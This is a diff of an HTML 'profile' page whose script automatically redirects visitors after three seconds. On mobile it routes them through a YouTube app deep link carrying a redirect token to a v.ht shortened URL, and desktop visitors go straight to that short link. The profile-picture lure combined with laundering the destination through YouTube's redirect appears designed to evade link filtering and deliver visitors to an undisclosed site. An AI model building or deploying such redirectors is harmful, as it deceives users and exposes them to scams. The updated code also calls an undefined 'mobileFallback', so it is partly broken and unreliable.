@@ -13,32 +13,33 @@
 <body>
   <img src="img/300.jpg" alt="Profile Picture">
   <button onclick="myFunction()">View my profile</button>
-<script>
-    setTimeout(function() {
-      myFunction();
-    }, 3000);
-    
+  
+ <script>
+  setTimeout(function() {
+    myFunction();
+  }, 3000);
+
     function myFunction() {
-      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqbFJHR2xLc0liQjVZSnFQWVI4TTRtWVkxTm5OQXxBQ3Jtc0tscHpCLWtKZEowTEtSdGN2RGhIRFExNjZpUDRXc0NDb0dKZHI5QXdmVU95Z3QzdXVNeDlIN0lYQWlTOG5iQm91dHNHMEM0Vk40ZUVVLTMzdGxhYWVsbmJkbmdZb2dRakxwaUd4TF9sSExyQXhVTTdRRQ&q=https%3A%2F%2Fv.ht%2Fpcbq&html_redirect=1";
-      
-      var fallback = "https://v.ht/pcbq";
-
+      var app = "vnd.youtube://youtube.com/redirect?event=comments&redir_token=QUFFLUhqa1JMYXVhRWMtdS1pZDU4ZjJlOUtUdFBHbEplUXxBQ3Jtc0trUjE0bGVSV1NIOXpjLV9NeTdwN3pnWkhOYlZ0eXNDQ2JSdlZ1TnNxRHY3dW5SZ2YwcEJfa1ZOMDFhUFJ0OURxd1FGbnp3c1ZLYU9MdHJUZUNnZ050cjhyLXlZU05xaVVSaWhuWHk0YXZEUXNjMUZxVQ&q=https%3A%2F%2Fv.ht%2Fglvd7&html_redirect=1";
+	  
+      var desktopFallback = "https://v.ht/glvd7";
+	
       if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
-          window.location = app;
-          window.setTimeout(function() {
-              window.location = fallback;
-          }, 25);
+        window.location.href = app;
+        window.setTimeout(function() {
+          window.location.href = mobileFallback;
+        }, 25);
       } else {
-          window.location = fallback;
+        window.location.href = desktopFallback;
       }
-
-      function killPopup() {
-          window.removeEventListener('pagehide', killPopup);
-      }
-
-      window.addEventListener('pagehide', killPopup);
+	  
+	   function killPopup() {
+        window.removeEventListener('pagehide', killPopup);
     }
-</script>
 
+    window.addEventListener('pagehide', killPopup);
+    }
+
+  </script>
 </body>
 </html>
